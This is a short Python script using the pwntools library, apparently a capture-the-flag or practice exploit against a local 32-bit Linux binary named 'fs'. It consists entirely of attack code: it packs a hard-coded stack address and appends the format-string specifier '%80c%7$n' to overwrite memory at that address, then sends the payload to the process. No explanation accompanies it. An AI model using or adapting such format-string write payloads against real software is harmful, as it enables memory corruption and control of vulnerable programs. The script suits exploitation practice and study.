from pwn import *
context(arch='i386',os='linux',log_level="debug")

p = process('./fs')
#gdb.attach(p,"b *0x56555666")
payload = p32(0xffffd398) + "%80c%7$n"
p.sendline(payload)
print(p.recvall())




